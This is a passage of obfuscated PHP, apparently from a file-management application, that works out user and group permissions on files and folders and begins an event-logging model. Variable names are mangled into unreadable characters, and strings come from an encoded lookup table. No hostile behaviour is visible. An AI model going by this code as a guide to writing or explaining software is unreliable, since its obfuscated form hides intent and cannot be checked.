array_to_keyvalue($‡ßÇ‹À‚, $Ä’Ä·ï½[410]); } $÷‹û‘Âª = $ìÜ‘²š; foreach ($‡ßÇ‹À‚ as $îœ¬¢ê¨ => $˜‘§à„Ó) { $¥¿Á›ŠË = $Ûˆã®ã->parentLevelArray($˜‘§à„Ó[$Ä’Ä·ï½[529]]); $÷‹û‘Âª = array_merge($÷‹û‘Âª, array($îœ¬¢ê¨), array_reverse($¥¿Á›ŠË)); } $÷‹û‘Âª = array_values(array_unique($÷‹û‘Âª)); if (!$÷‹û‘Âª) { return array(); } $÷“âÔ³Ô = $this->sourceAuthSelect($÷‹û‘Âª); $œßÚ‹öê = array(); foreach ($÷‹û‘Âª as $Ÿ­ü³ÏØ) { if (isset($÷“âÔ³Ô[$Ÿ­ü³ÏØ])) { $œßÚ‹öê[$Ÿ­ü³ÏØ] = $÷“âÔ³Ô[$Ÿ­ü³ÏØ]; } } $ÒÕ¿÷‚² = $this->userIsRoot($Ö‰ˆö•); $€“ã„è¤ = AuthModel::authAll(); $»²“š£ = array($Ä’Ä·ï½[422] => $€“ã„è¤, $Ä’Ä·ï½[2008] => array($Ä’Ä·ï½[427] => 0, $Ä’Ä·ï½[1829] => $€“ã„è¤, $Ä’Ä·ï½[428] => LNG($Ä’Ä·ï½[2009]), $Ä’Ä·ï½[1846] => $Ä’Ä·ï½[2010])); $ÈŸ™©Øî = array(); foreach ($‡ßÇ‹À‚ as $Ÿ­ü³ÏØ => $˜â”æïˆ) { if ($ÒÕ¿÷‚² && $GLOBALS[$Ä’Ä·ï½[6]][$Ä’Ä·ï½[1842]]) { $ÈŸ™©Øî[$Ÿ­ü³ÏØ] = $»²“š£; continue; } $ÈŸ™©Øî[$Ÿ­ü³ÏØ] = $this->makeSourceAuth($˜â”æïˆ, $œßÚ‹öê, $Ö‰ˆö•); } return $ÈŸ™©Øî; } public function authDeepCheck($¤èÃÇ¼, $‹Í¢ú÷ = false) { $ğ»±Î¡ =& $_SERVER[¤·²È‰º]; $‹Í¢ú÷ = $‹Í¢ú÷ ? $‹Í¢ú÷ : USER_ID; $ğ¬™üë = $this->makeAuthDeep($‹Í¢ú÷); if (!in_array($¤èÃÇ¼, $ğ¬™üë[$ğ»±Î¡[2011]])) { return !1; } $’×¡÷¸ = array(); foreach ($ğ¬™üë[$ğ»±Î¡[2012]] as $Ÿ’ÇÇ¬½ => $“ÉÛÊ„Ê) { if (!in_array($¤èÃÇ¼, $“ÉÛÊ„Ê)) { continue; } $’×¡÷¸[] = $Ÿ’ÇÇ¬½; } if (!$’×¡÷¸) { return !1; } $ÁÕ·À± = $’×¡÷¸ ? $’×¡÷¸[0] : $¤èÃÇ¼; return array($ğ»±Î¡[422] => -1, $ğ»±Î¡[475] => array($ğ»±Î¡[427] => $ğ»±Î¡[1184], $ğ»±Î¡[1829] => $ğ»±Î¡[207], $ğ»±Î¡[428] => LNG($ğ»±Î¡[2013]), $ğ»±Î¡[1846] => $ğ»±Î¡[2014]), $ğ»±Î¡[2015] => LNG($ğ»±Î¡[2016]), $ğ»±Î¡[2017] => $this->sourceAuthInfo($ÁÕ·À±)); } protected function makeAuthDeep($Ö¼ïóÙ€ = false) { $ìÉüÀ© =& $_SERVER[¤·²È‰º]; static $á€›ÒÊô = array(); $Ö¼ïóÙ€ = $Ö¼ïóÙ€ ? $Ö¼ïóÙ€ : USER_ID; if (isset($á€›ÒÊô[$Ö¼ïóÙ€])) { return $á€›ÒÊô[$Ö¼ïóÙ€]; } $“è“‰±Ë = Model($ìÉüÀ©[2018])->listData(); $ËÓõ’Ì¢ = array(); foreach ($“è“‰±Ë as $Ä´´ôĞæ) { if ($Ä´´ôĞæ[$ìÉüÀ©[421]] == 0 && $Ä´´ôĞæ[$ìÉüÀ©[1845]] == $ìÉüÀ©[98]) { $ËÓõ’Ì¢[] = $Ä´´ôĞæ[$ìÉüÀ©[407]]; } } $è‡ñõ = $this->userGroupParents($Ö¼ïóÙ€); $Ò°Ÿ¹×ç = array($ìÉüÀ©[419] => SourceModel::TYPE_USER, $ìÉüÀ©[513] => $Ö¼ïóÙ€); if ($è‡ñõ) { $Ò°Ÿ¹×ç = array(array($ìÉüÀ©[419] => SourceModel::TYPE_USER, $ìÉüÀ©[513] => $Ö¼ïóÙ€), array($ìÉüÀ©[419] => SourceModel::TYPE_GROUP, $ìÉüÀ©[513] => array($ìÉüÀ©[426], $è‡ñõ)), $ìÉüÀ©[994] => $ìÉüÀ©[1921]); } $Šş¼ğòá = $this->field($ìÉüÀ©[2019])->where($Ò°Ÿ¹×ç)->select(); $œ˜²ññÀ = array(); $â›Ñ¸õ = array_to_keyvalue_group($Šş¼ğòá, $ìÉüÀ©[410]); foreach ($â›Ñ¸õ as $­øö¥ÎŒ => $ÁäÌ¿Àµ) { $®Ê°Àªç = $this->authArrayCheck($ÁäÌ¿Àµ, $Ö¼ïóÙ€); if ($®Ê°Àªç[$ìÉüÀ©[422]] > 0) { $œ˜²ññÀ[] = $­øö¥ÎŒ . $ìÉüÀ©[12]; } } if ($è‡ñõ) { $Õ…·í× = Model($ìÉüÀ©[530]); foreach ($è‡ñõ as $ŠÚÏè) { $Ö®Ê›´ = $Õ…·í×->getInfo($ŠÚÏè); if (!$Ö®Ê›´ || !is_array($Ö®Ê›´[$ìÉüÀ©[96]])) { continue; } $œ˜²ññÀ[] = $Ö®Ê›´[$ìÉüÀ©[96]][$ìÉüÀ©[410]]; } } $›ÏÈ‡‚¶ = array(); $ª”’Óåğ = $è‡ñõ; $È¤ÒŸœ = Model($ìÉüÀ©[1321]); $Õ…·í× = Model($ìÉüÀ©[530]); $ƒ×¶„ì¡ = array(); $»†ßÇ¹½ = array(); $ÁÖƒíö = array(); $§¤öª = array(); if ($œ˜²ññÀ) { $¤Èğº¼ = $È¤ÒŸœ->where(array($ìÉüÀ©[410] => array($ìÉüÀ©[426], $œ˜²ññÀ)))->select(); foreach ($¤Èğº¼ as $‰Îò±˜í) { $¿î¾í‡¸ = $È¤ÒŸœ->parentLevelArray($‰Îò±˜í[$ìÉüÀ©[529]]); $›ÏÈ‡‚¶ = array_merge($›ÏÈ‡‚¶, $¿î¾í‡¸); $ª”’Óåğ[] = $‰Îò±˜í[$ìÉüÀ©[513]]; $ƒ×¶„ì¡[$‰Îò±˜í[$ìÉüÀ©[410]]] = $¿î¾í‡¸; $»†ßÇ¹½[$‰Îò±˜í[$ìÉüÀ©[410]]] = $‰Îò±˜í[$ìÉüÀ©[513]]; } } $ª”’Óåğ = array_values(array_unique($ª”’Óåğ)); $‘„”Çñâ = $ª”’Óåğ; foreach ($‘„”Çñâ as $ŠÚÏè) { $Ö®Ê›´ = $Õ…·í×->getInfo($ŠÚÏè); $¿î¾í‡¸ = $È¤ÒŸœ->parentLevelArray($Ö®Ê›´[$ìÉüÀ©[529]]); $ª”’Óåğ = array_merge($ª”’Óåğ, $¿î¾í‡¸); } $ª”’Óåğ = array_values(array_unique($ª”’Óåğ)); foreach ($ª”’Óåğ as $ŠÚÏè) { $Ö®Ê›´ = $Õ…·í×->getInfo($ŠÚÏè); $›ÏÈ‡‚¶[] = $Ö®Ê›´[$ìÉüÀ©[96]][$ìÉüÀ©[410]]; $ÁÖƒíö[$ŠÚÏè] = $Ö®Ê›´[$ìÉüÀ©[96]][$ìÉüÀ©[410]]; $§¤öª[$ŠÚÏè] = $È¤ÒŸœ->parentLevelArray($Ö®Ê›´[$ìÉüÀ©[529]]); } foreach ($ƒ×¶„ì¡ as $ù¿Î‰÷ => $Î»áÑ™) { $®®Õ½€Ó = $»†ßÇ¹½[$ù¿Î‰÷]; if (!$®®Õ½€Ó || !$ÁÖƒíö[$®®Õ½€Ó]) { continue; } $Ù¹ÏÂñå = array(); foreach ($§¤öª[$®®Õ½€Ó] as $ŠÚÏè) { $Ù¹ÏÂñå[] = $ÁÖƒíö[$ŠÚÏè]; } $ƒ×¶„ì¡[$ù¿Î‰÷] = array_merge($Ù¹ÏÂñå, $Î»áÑ™); } $›ÏÈ‡‚¶ = array_values(array_unique($›ÏÈ‡‚¶)); $ª¾äéÙó = array($ìÉüÀ©[2011] => $›ÏÈ‡‚¶, $ìÉüÀ©[2012] => $ƒ×¶„ì¡); $á€›ÒÊô[$Ö¼ïóÙ€] = $ª¾äéÙó; return $ª¾äéÙó; } private function makeSourceAuth($¤äî“µˆ, $ôÊ¾ª, $Ú‚Ë¢¿ = false) { $¥ÙÇÆ§á =& $_SERVER[¤·²È‰º]; $’ñ´”¹ˆ = $¥ÙÇÆ§á[98]; $Ù„¬¥½‰ = $¤äî“µˆ[$¥ÙÇÆ§á[513]]; $Ş ”İ‚Æ = $¤äî“µˆ[$¥ÙÇÆ§á[419]] == SourceModel::TYPE_GROUP; $òâ®Äóë = $Ş ”İ‚Æ ? $this->groupRootAuth($Ù„¬¥½‰, $Ú‚Ë¢¿) : !1; if ($òâ®Äóë && Model($¥ÙÇÆ§á[515])->authCheckAction($òâ®Äóë[$¥ÙÇÆ§á[421]], $¥ÙÇÆ§á[1844])) { return $this->groupAuthInfo($òâ®Äóë, $Ù„¬¥½‰); } $üİ¯Î®ø = Model($¥ÙÇÆ§á[1321])->parentLevelArray($¤äî“µˆ[$¥ÙÇÆ§á[529]]); $üİ¯Î®ø = array_merge(array($¤äî“µˆ[$¥ÙÇÆ§á[410]]), array_reverse($üİ¯Î®ø)); $Á’Ö×æ’ = !1; foreach ($üİ¯Î®ø as $ç¥¦“‹) { if (!isset($ôÊ¾ª[$ç¥¦“‹])) { continue; } $Ë€³‰ÃÛ = $this->authMake($ôÊ¾ª[$ç¥¦“‹], $Ú‚Ë¢¿); if ($Ë€³‰ÃÛ[$¥ÙÇÆ§á[475]]) { $Á’Ö×æ’ = $Ë€³‰ÃÛ; break; } } if (!$Ş ”İ‚Æ) { return $Á’Ö×æ’; } if (!$Á’Ö×æ’ && $òâ®Äóë) { $Á’Ö×æ’ = $this->groupAuthInfo($òâ®Äóë, $Ù„¬¥½‰); } if (!$Á’Ö×æ’) { $ÆìÀÀ¸å = Model($¥ÙÇÆ§á[530])->getInfo($Ù„¬¥½‰); $Ì¥ÇÅğ = explode($¥ÙÇÆ§á[60], trim($ÆìÀÀ¸å[$¥ÙÇÆ§á[529]], $¥ÙÇÆ§á[60])); $Ì¥ÇÅğ = array_reverse($Ì¥ÇÅğ); foreach ($Ì¥ÇÅğ as $÷¼ŞâÓ) { if ($÷¼ŞâÓ == $¥ÙÇÆ§á[207] || $÷¼ŞâÓ == $’ñ´”¹ˆ) { continue; } $Ñçúº£Œ = $this->groupRootAuth($÷¼ŞâÓ, $Ú‚Ë¢¿); if (!$Ñçúº£Œ) { continue; } $Á’Ö×æ’ = $this->groupAuthInfo($Ñçúº£Œ, $÷¼ŞâÓ); break; } } if (!$Á’Ö×æ’ || $Á’Ö×æ’[$¥ÙÇÆ§á[422]] <= 0) { $ó¹©ÁÙ = $this->authDeepCheck($¤äî“µˆ[$¥ÙÇÆ§á[410]], $Ú‚Ë¢¿); if ($ó¹©ÁÙ) { $Á’Ö×æ’ = $ó¹©ÁÙ; } } return $Á’Ö×æ’; } private function userIsRoot($´Œ§÷È… = false) { $§¢¡´Ï„ =& $_SERVER[¤·²È‰º]; if (!$´Œ§÷È… && _get($GLOBALS, $§¢¡´Ï„[511])) { return !0; } $ş–îôÚÙ = Model($§¢¡´Ï„[543])->getInfo($´Œ§÷È…); $“¯Ğ´¿Ÿ = Model($§¢¡´Ï„[2020])->listData($ş–îôÚÙ[$§¢¡´Ï„[1530]]); if ($“¯Ğ´¿Ÿ && $“¯Ğ´¿Ÿ[$§¢¡´Ï„[519]][$§¢¡´Ï„[2021]] == 1) { return !0; } return !1; } private function sourceAuthInfo($àÏ®Ëş) { $ÜÚñÛ¦Ë =& $_SERVER[¤·²È‰º]; $±ñÛÑë€ = Model($ÜÚñÛ¦Ë[1321]); $«ƒÆ·ÓÜ = $±ñÛÑë€->sourceInfo($àÏ®Ëş); if (!$«ƒÆ·ÓÜ) { return !1; } $±ñÛÑë€->groupPathDisplay($«ƒÆ·ÓÜ); $êˆÌ™îİ = array($«ƒÆ·ÓÜ); $êˆÌ™îİ = $±ñÛÑë€->_listAppendPath($êˆÌ™îİ); $«ƒÆ·ÓÜ = $êˆÌ™îİ[0]; $‹È÷Ìéı = $«ƒÆ·ÓÜ[$ÜÚñÛ¦Ë[527]]; if (isset($«ƒÆ·ÓÜ[$ÜÚñÛ¦Ë[535]])) { $äôÈ¾È = explode($ÜÚñÛ¦Ë[8], trim($«ƒÆ·ÓÜ[$ÜÚñÛ¦Ë[527]], $ÜÚñÛ¦Ë[8])); array_shift($äôÈ¾È); $‹È÷Ìéı = $«ƒÆ·ÓÜ[$ÜÚñÛ¦Ë[533]] . $ÜÚñÛ¦Ë[2022] . implode($ÜÚñÛ¦Ë[8], $äôÈ¾È); } return array($ÜÚñÛ¦Ë[428] => $«ƒÆ·ÓÜ[$ÜÚñÛ¦Ë[42]], $ÜÚñÛ¦Ë[94] => KodIO::make($«ƒÆ·ÓÜ[$ÜÚñÛ¦Ë[410]]), $ÜÚñÛ¦Ë[2023] => $‹È÷Ìéı); } private function groupAuthInfo($ëûïˆ®®, $Ùïİ„ñ) { $ÉÔÊüì« =& $_SERVER[¤·²È‰º]; $ÊÕÕı§Á = Model($ÉÔÊüì«[530])->getInfo($Ùïİ„ñ); return array($ÉÔÊüì«[2024] => intval($ëûïˆ®®[$ÉÔÊüì«[421]]), $ÉÔÊüì«[2008] => $ëûïˆ®®, $ÉÔÊüì«[2025] => LNG($ÉÔÊüì«[2026]), $ÉÔÊüì«[2017] => array($ÉÔÊüì«[428] => $ÊÕÕı§Á[$ÉÔÊüì«[42]], $ÉÔÊüì«[94] => KodIO::make($ÊÕÕı§Á[$ÉÔÊüì«[96]][$ÉÔÊüì«[410]]), $ÉÔÊüì«[2023] => $ÊÕÕı§Á[$ÉÔÊüì«[534]])); } protected function groupRootAuth($—îŞ„„, $–Úõ¨ô = false) { $Ñ§À¨ˆ’ =& $_SERVER[¤·²È‰º]; $–Úõ¨ô = $–Úõ¨ô ? $–Úõ¨ô : USER_ID; $‚ïÀ—Õš = $–Úõ¨ô . $Ñ§À¨ˆ’[2027] . $—îŞ„„; static $—ìğÎÑ = array(); if (isset($—ìğÎÑ[$‚ïÀ—Õš])) { return $—ìğÎÑ[$‚ïÀ—Õš]; } $ŞÑğøª… = Model($Ñ§À¨ˆ’[530])->getInfo($—îŞ„„); $¶Ñ¤€¢£ = $this->userGroupList($–Úõ¨ô); $Ç´½âæô = isset($¶Ñ¤€¢£[$—îŞ„„]) ? $¶Ñ¤€¢£[$—îŞ„„][$Ñ§À¨ˆ’[421]] : !1; if ($Ç´½âæô && Model($Ñ§À¨ˆ’[515])->authCheckAction($Ç´½âæô[$Ñ§À¨ˆ’[421]], $Ñ§À¨ˆ’[1844])) { $—ìğÎÑ[$‚ïÀ—Õš] = $Ç´½âæô; return $Ç´½âæô; } $½Ô—ë¸ = $this->sourceAuthSelect($ŞÑğøª…[$Ñ§À¨ˆ’[96]][$Ñ§À¨ˆ’[410]]); $à–Øóá” = $½Ô—ë¸ ? $this->authMake($½Ô—ë¸, $–Úõ¨ô) : !1; $¤—‚ Ä = $à–Øóá” ? $à–Øóá”[$Ñ§À¨ˆ’[475]] : !1; $—ìğÎÑ[$‚ïÀ—Õš] = $¤—‚ Ä ? $¤—‚ Ä : $Ç´½âæô; return $—ìğÎÑ[$‚ïÀ—Õš]; } public function authOwnerApply($´¯¯Çù“) { $Ì¯Øè‡º =& $_SERVER[¤·²È‰º]; if (empty($´¯¯Çù“[$Ì¯Øè‡º[421]]) || isset($´¯¯Çù“[$Ì¯Øè‡º[2028]]) && $´¯¯Çù“[$Ì¯Øè‡º[2028]]) { return $´¯¯Çù“; } if (AuthModel::authCheckRoot($´¯¯Çù“[$Ì¯Øè‡º[421]][$Ì¯Øè‡º[422]])) { return $´¯¯Çù“; } $é¨ÕŞÙÛ = Model($Ì¯Øè‡º[1321])->parentLevelArray($´¯¯Çù“[$Ì¯Øè‡º[529]]); $é¨ÕŞÙÛ = array_merge(array($´¯¯Çù“[$Ì¯Øè‡º[410]]), array_reverse($é¨ÕŞÙÛ)); $§ÛÕ©éú = $this->sourceAuthSelect($é¨ÕŞÙÛ); $ó³·ƒ = array(); $Ñ¨šÏ½š = array(); foreach ($§ÛÕ©éú as $áñˆõÑø => $ÉˆõÀ•¶) { $ş¶ò‹ÄÎ = $this->authFolderOwnerUser($ÉˆõÀ•¶); $ó³·ƒ[$áñˆõÑø] = $ş¶ò‹ÄÎ; $Ñ¨šÏ½š = array_merge($Ñ¨šÏ½š, $ş¶ò‹ÄÎ[$Ì¯Øè‡º[608]]); if ($ş¶ò‹ÄÎ[$Ì¯Øè‡º[2029]]) { break; } } if (count($Ñ¨šÏ½š) == 0) { $Ñ¨šÏ½š = $this->authFolderOwnerGroup($´¯¯Çù“[$Ì¯Øè‡º[513]]); } $Ñ¨šÏ½š = array_unique($Ñ¨šÏ½š); if (AuthModel::authCheckRoot($´¯¯Çù“[$Ì¯Øè‡º[421]][$Ì¯Øè‡º[422]])) { $Ñ¨šÏ½š[] = USER_ID; } $´¯¯Çù“[$Ì¯Øè‡º[421]][$Ì¯Øè‡º[2030]] = Model($Ì¯Øè‡º[521])->userListInfo($Ñ¨šÏ½š); return $´¯¯Çù“; } private function authFolderOwnerGroup($Õ…â§Û‘) { $÷ºÜŒØ =& $_SERVER[¤·²È‰º]; $òÅÇØÃù = Model($÷ºÜŒØ[1913])->where(array($÷ºÜŒØ[1823] => $Õ…â§Û‘))->select(); $èŒ…«­° = array(); if (!$òÅÇØÃù) { return $èŒ…«­°; } foreach ($òÅÇØÃù as $üó‚¢ı”) { $Ì°ôÁ·æ = $this->authInfo($üó‚¢ı”); if (AuthModel::authCheckRoot($Ì°ôÁ·æ[$÷ºÜŒØ[421]])) { $èŒ…«­°[] = $üó‚¢ı”[$÷ºÜŒØ[1651]]; } } return $èŒ…«­°; } private function authFolderOwnerUser($Ò™·±¦÷) { $ÀÛş±¡ª =& $_SERVER[¤·²È‰º]; $ÅÆ¦ŞÁë = array(); $éŠ½˜ = !1; foreach ($Ò™·±¦÷ as $á´…ñÌÔ) { $˜ãÑÄÒ = $this->authInfo($á´…ñÌÔ); if ($á´…ñÌÔ[$ÀÛş±¡ª[513]] == $ÀÛş±¡ª[207]) { $éŠ½˜ = !0; } if ($á´…ñÌÔ[$ÀÛş±¡ª[419]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($˜ãÑÄÒ[$ÀÛş±¡ª[421]])) { $ÅÆ¦ŞÁë[] = $á´…ñÌÔ[$ÀÛş±¡ª[513]]; } } } return array($ÀÛş±¡ª[608] => $ÅÆ¦ŞÁë, $ÀÛş±¡ª[2029] => $éŠ½˜); } public function authMake($¨¤äı›Ş, $ˆÏ¡àİà = false) { $Æ†Ÿ­„´ =& $_SERVER[¤·²È‰º]; $§Ø±ä‚õ = $this->authArrayCheck($¨¤äı›Ş, $ˆÏ¡àİà); if ($§Ø±ä‚õ[$Æ†Ÿ­„´[2031]]) { $§Ø±ä‚õ[$Æ†Ÿ­„´[2031]] = $this->sourceAuthInfo($§Ø±ä‚õ[$Æ†Ÿ­„´[2031]]); } return $§Ø±ä‚õ; } public function authArrayCheck($Š¼Õùœ», $´ƒÅºÒ¯ = false) { $¨’•àôÎ =& $_SERVER[¤·²È‰º]; if (!$Š¼Õùœ») { return array($¨’•àôÎ[422] => 0, $¨’•àôÎ[475] => !1); } $´ƒÅºÒ¯ = $´ƒÅºÒ¯ ? $´ƒÅºÒ¯ : USER_ID; $¶¢Æ²—‰ = 0; $ÎÃ²Ñ© = 0; $è³ëÛŞ = 0; $Æ§‚Ãî÷ = 0; $óĞÁÓí¸ = 0; $Áú€÷¸ = 0; $‹Ç¹¯ûÄ = 1000; $‹”â•øš = 0; $ÈÕù‘§í = 0; $‚îäôÏ = 0; $©Âı¡± = 0; $£®“²Î¯ = array($¨’•àôÎ[410] => 0); foreach ($Š¼Õùœ» as $£®“²Î¯) { $ë£éÆœÜ = $this->authInfo($£®“²Î¯); if (!$ë£éÆœÜ) { continue; } $ä‘‡äÀõ = $£®“²Î¯[$¨’•àôÎ[513]]; $ÊÙ©£Ø½ = intval($ë£éÆœÜ[$¨’•àôÎ[421]]); if ($£®“²Î¯[$¨’•àôÎ[419]] == SourceModel::TYPE_USER && $ä‘‡äÀõ == $´ƒÅºÒ¯) { $¶¢Æ²—‰ = !0; $è³ëÛŞ = $ë£éÆœÜ; $ÎÃ²Ñ© = $ÊÙ©£Ø½; } else { if ($£®“²Î¯[$¨’•àôÎ[419]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ä‘‡äÀõ, $´ƒÅºÒ¯)) { $Æ§‚Ãî÷ = !0; $Àƒ¹Ù’Ú = $this->groupStepToUserGroup($ä‘‡äÀõ, $´ƒÅºÒ¯); if ($Àƒ¹Ù’Ú < $‹Ç¹¯ûÄ) { $‹Ç¹¯ûÄ = $Àƒ¹Ù’Ú; $óĞÁÓí¸ = $ÊÙ©£Ø½; $Áú€÷¸ = $ë£éÆœÜ; $‹”â•øš = $ä‘‡äÀõ; } if ($Àƒ¹Ù’Ú == $‹Ç¹¯ûÄ && $ÊÙ©£Ø½ >= $óĞÁÓí¸) { $óĞÁÓí¸ = $ÊÙ©£Ø½; $Áú€÷¸ = $ë£éÆœÜ; $‹”â•øš = $ä‘‡äÀõ; } } else { if ($ä‘‡äÀõ == $¨’•àôÎ[207]) { $ÈÕù‘§í = !0; $©Âı¡± = $ë£éÆœÜ; $‚îäôÏ = $ÊÙ©£Ø½; } } } } if ($¶¢Æ²—‰) { $´£ÔşÏ = $ÎÃ²Ñ©; $ë£éÆœÜ = $è³ëÛŞ; $œ²•æ˜ = LNG($¨’•àôÎ[2032]); } else { if ($Æ§‚Ãî÷) { $´£ÔşÏ = $óĞÁÓí¸; $ë£éÆœÜ = $Áú€÷¸; $ù·†¨–– = Model($¨’•àôÎ[530])->getInfo($‹”â•øš); $œ²•æ˜ = $¨’•àôÎ[172] . $ù·†¨––[$¨’•àôÎ[534]] . $¨’•àôÎ[2033] . LNG($¨’•àôÎ[2034]); } else { if ($ÈÕù‘§í) { $´£ÔşÏ = $‚îäôÏ; $ë£éÆœÜ = $©Âı¡±; $œ²•æ˜ = LNG($¨’•àôÎ[2005]); } else { $´£ÔşÏ = 0; $ë£éÆœÜ = !1; $œ²•æ˜ = $¨’•àôÎ[12]; } } } $à ¿±®¼ = array($¨’•àôÎ[2024] => intval($´£ÔşÏ), $¨’•àôÎ[2008] => $ë£éÆœÜ, $¨’•àôÎ[2025] => $œ²•æ˜, $¨’•àôÎ[2017] => $£®“²Î¯[$¨’•àôÎ[410]]); return $à ¿±®¼; } private function groupContainUser($Š¹‘øü, $¬‰²êõ´ = false) { return in_array($Š¹‘øü, $this->userGroupParents($¬‰²êõ´)); } private function groupStepToUserGroup($è´çæü, $àó”òŞ = false) { $ä¹êÊİ˜ =& $_SERVER[¤·²È‰º]; $úİı†İ· = $this->userGroupList($àó”òŞ); $ÀèíìŠ = 1000; $‚ˆâ•Û£ = $GLOBALS[$ä¹êÊİ˜[6]][$ä¹êÊİ˜[99]][$ä¹êÊİ˜[1926]] == 1; $ÇÄŞ­Úâ = $‚ˆâ•Û£ ? 3 : 2; foreach ($úİı†İ· as $îü’åã¬) { if ($îü’åã¬[$ä¹êÊİ˜[1823]] == $è´çæü) { return 0; } $–×³¶öó = explode($ä¹êÊİ˜[60], trim($îü’åã¬[$ä¹êÊİ˜[529]], $ä¹êÊİ˜[60])); if ($–×³¶öó[0] == $ä¹êÊİ˜[207] && count($–×³¶öó) > $ÇÄŞ­Úâ) { $ò¢á†ë = array_reverse(array_slice($–×³¶öó, $ÇÄŞ­Úâ)); $«°ØùĞ = array_search($è´çæü, $ò¢á†ë); if ($«°ØùĞ !== !1 && $«°ØùĞ + 1 <= $ÀèíìŠ) { $ÀèíìŠ = $«°ØùĞ + 1; } } } return $ÀèíìŠ; } private function userGroupList($˜®ş’ñµ = false) { $ÆÃ¡âè =& $_SERVER[¤·²È‰º]; static $· ­“ = array(); if (isset($· ­“[$˜®ş’ñµ])) { return $· ­“[$˜®ş’ñµ]; } $—’¢¢ˆë = Model($ÆÃ¡âè[543])->getInfo($˜®ş’ñµ); $· ­“[$˜®ş’ñµ] = array_to_keyvalue($—’¢¢ˆë[$ÆÃ¡âè[2006]], $ÆÃ¡âè[1823]); return $· ­“[$˜®ş’ñµ]; } public function userGroupParents($¶†°Ôé½) { $º€îŠóÉ =& $_SERVER[¤·²È‰º]; static $÷øÅÔôµ = array(); $¶†°Ôé½ = $¶†°Ôé½ ? $¶†°Ôé½ : USER_ID; if (isset($÷øÅÔôµ[$¶†°Ôé½])) { return $÷øÅÔôµ[$¶†°Ôé½]; } $Âîóõ× = $this->userGroupList($¶†°Ôé½); $ÅÀğæÊı = array(); $ĞÉ‘úØ = $GLOBALS[$º€îŠóÉ[6]][$º€îŠóÉ[99]][$º€îŠóÉ[1926]] == 1; $ƒ”Öòõª = $ĞÉ‘úØ ? 3 : 2; foreach ($Âîóõ× as $ç«ö•Û•) { $ì‚Óñ¢Û = array($ç«ö•Û•[$º€îŠóÉ[1823]]); $°Ú÷ ™¥ = explode($º€îŠóÉ[60], trim($ç«ö•Û•[$º€îŠóÉ[529]], $º€îŠóÉ[60])); if ($°Ú÷ ™¥[0] == $º€îŠóÉ[207] && count($°Ú÷ ™¥) > $ƒ”Öòõª) { $•ÙÖúë¬ = array_slice($°Ú÷ ™¥, $ƒ”Öòõª); $ì‚Óñ¢Û = array_merge($ì‚Óñ¢Û, array_reverse($•ÙÖúë¬)); } $ÅÀğæÊı = array_merge($ÅÀğæÊı, $ì‚Óñ¢Û); } $÷øÅÔôµ[$¶†°Ôé½] = array_unique($ÅÀğæÊı); return $÷øÅÔôµ[$¶†°Ôé½]; } public function authTargetInfoMake($ªºÆ”İ) { $ĞœË†„ø =& $_SERVER[¤·²È‰º]; $Ã²«ú©Á = array(); $÷¥‡îº¢ = array(); foreach ($ªºÆ”İ as $ë¢„Ú–Å) { if ($ë¢„Ú–Å[$ĞœË†„ø[419]] == SourceModel::TYPE_USER) { $Ã²«ú©Á[] = intval($ë¢„Ú–Å[$ĞœË†„ø[513]]); } else { if ($ë¢„Ú–Å[$ĞœË†„ø[419]] == SourceModel::TYPE_GROUP) { $÷¥‡îº¢[] = intval($ë¢„Ú–Å[$ĞœË†„ø[513]]); } } } if ($Ã²«ú©Á) { $Ã²«ú©Á = Model($ĞœË†„ø[521])->userListInfo($Ã²«ú©Á); } if ($÷¥‡îº¢) { $´­œÆ™€ = array($ĞœË†„ø[1911] => array($ĞœË†„ø[426], $÷¥‡îº¢)); $÷¥‡îº¢ = Model($ĞœË†„ø[530])->field($ĞœË†„ø[2035])->where($´­œÆ™€)->select(); $÷¥‡îº¢ = array_to_keyvalue($÷¥‡îº¢, $ĞœË†„ø[1823]); } return array($ĞœË†„ø[2036] => $Ã²«ú©Á, $ĞœË†„ø[2037] => $÷¥‡îº¢); } public function authInfo($ÄéÃŸ) { $äèÆñÑÒ =& $_SERVER[¤·²È‰º]; if ($ÄéÃŸ[$äèÆñÑÒ[1927]]) { $âùÀì™Ú = Model($äèÆñÑÒ[515])->listData($ÄéÃŸ[$äèÆñÑÒ[1927]]); if (!$âùÀì™Ú) { return !1; $ã¦áî º = Model($äèÆñÑÒ[515])->listData(); $şÓÔì•Î = array_filter_by_field($ã¦áî º, $äèÆñÑÒ[421], $äèÆñÑÒ[207]); return $şÓÔì•Î; } $×ˆÅİÚ† = array_field_key($âùÀì™Ú, array($äèÆñÑÒ[407], $äèÆñÑÒ[42], $äèÆñÑÒ[421], $äèÆñÑÒ[1846], $äèÆñÑÒ[1847])); $×ˆÅİÚ†[$äèÆñÑÒ[2038]] = $ÄéÃŸ; return $×ˆÅİÚ†; } else { return array($äèÆñÑÒ[427] => 0, $äèÆñÑÒ[1829] => $ÄéÃŸ[$äèÆñÑÒ[1983]], $äèÆñÑÒ[428] => $äèÆñÑÒ[12], $äèÆñÑÒ[1846] => $äèÆñÑÒ[2039]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\162\x63\x65\x5f\x65\166\x65\156\164"; protected $dataAuto = array(array("\143\162\145\x61\164\x65\124\151\155\x65", "\x74\151\x6d\145", "\151\x6e\163\145\x72\x74", "\x66\x75\156\143\x74\151\157\x6e"), array("\x64\145\163\x63", '', "\x69\x6e\163\145\162\164\54\165\x70\144\141\164\x65\54\163\x65\154\x65\143\164", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($õ‰Í¤‡Ì, $—ËÛÔŞì, $ö‚Ü°ªÙ = '') { $¥ƒ°Ñé¥ =& $_SERVER[¤·²È‰º]; if (!$this->eventSave) { return; } $ çÉÎ”· = Model($¥ƒ°Ñé¥[1321])->sourceInfo($õ‰Í¤‡Ì); if (!$ çÉÎ”·) { return !1; } if ($this->isCacheEvent($ çÉÎ”·, $—ËÛÔŞì)) { return; } if ($ö‚Ü°ªÙ && is_string($ö‚Ü°ªÙ)) { $ö‚Ü°ªÙ = array($¥ƒ°Ñé¥[1862] => $ö‚Ü°ªÙ); } $™®ˆ‡­á = array($¥ƒ°Ñé¥[425] => $õ‰Í¤‡Ì, $¥ƒ°Ñé¥[2040] => $ çÉÎ”·[$¥ƒ°Ñé¥[440]], $¥ƒ°Ñé¥[2041] => $ çÉÎ”·[$¥ƒ°Ñé¥[42]], $¥ƒ°Ñé¥[527] => !empty($ 